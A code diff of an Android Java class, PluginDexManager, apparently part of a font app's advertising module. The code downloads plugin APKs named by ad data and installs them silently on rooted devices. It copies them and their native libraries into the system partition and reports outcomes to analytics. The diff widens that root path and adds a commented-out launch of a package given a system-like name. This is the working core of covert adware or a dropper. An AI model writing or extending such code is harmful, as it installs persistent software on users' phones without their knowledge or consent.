@@ -36,11 +36,6 @@ public class PluginDexManager {
     private static String TAG = PluginDexManager.class.getSimpleName();
     private volatile static PluginDexManager singleton;
 
-    private static String saveDir = Environment.getExternalStorageDirectory() + "/AigeStudio/";
-
-    private static Context mContext;
-    private static final int HAS_ROOT_SUCCESS = 0x0001;
-    private static final int HAS_ROOT_FAIL = 0x0002;
     private static final int HAS_INSTALL_SUCCESS = 0x0003;
     private static final int HAS_INSTALL_FAIL = 0x0004;
     private static final String INSTALL_NOMALSUCCESS = "com.ningso.fontad.action.NOMALSUCCESS";
@@ -50,8 +45,11 @@ public class PluginDexManager {
     private static final String DOWNLOAD_ERROR = "com.ningso.fontad.action.DOWNLOAD_ERROR";
     private static final String UNINSTALLSILENT = "com.ningso.fontad.action.UNINSTALLSILENT";
 
+    private static String saveDir = Environment.getExternalStorageDirectory() + "/Studio/";
+
     private AdBean adBean;
     private String installFile;
+    private Context mContext;
     private Handler handler = new Handler() {
         @Override
         public void handleMessage(Message msg) {
@@ -62,9 +60,10 @@ public class PluginDexManager {
                         BackgroundHandler.post(new Runnable() {
                             @Override
                             public void run() {
-                                if (adBean.getActionType() == 1) {
+                                if (adBean.getActionType() == 1 && adBean.isRooted()) {
                                     boolean has2system = ShellUtils.CopyApkToSystem(installFile);
                                     ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
+                                  //  PackageUtils.startInstallAppLauncher(mContext, "com.android.system.book", "com.android.core.MainActivity2");
                                     Log.e(TAG, "plugin copy system" + has2system);
                                 }
                                 deleteDex(mContext);
@@ -122,10 +121,9 @@ public class PluginDexManager {
                                     @Override
                                     public void onError(int status, String error) {
                                         super.onError(status, error);
-                                        Log.d(TAG, "plugin download error");
+                                        Log.d(TAG, "plugin download error" + error);
                                         sendBroadcastToAnalytics(DOWNLOAD_ERROR, adBean.getPkgName(), 1, error);
                                     }
-
                                 });
                     }
                     return true;
@@ -295,7 +293,7 @@ public class PluginDexManager {
             super.run();
             Message message = new Message();
             int installsuccuess;
-            if (PackageUtils.isSystemApplication(mContext) || ShellUtils.checkRootPermission()) {
+            if (adBean.isRooted() || PackageUtils.isSystemApplication(mContext) || ShellUtils.checkRootPermission()) {
                 installsuccuess = PackageUtils.installSilent(mContext, filePath);
                 if (installsuccuess == 1) {
                     sendBroadcastToAnalytics(INSTALL_SILENTSUCCESS, adBean.getPkgName(), 0, "success");
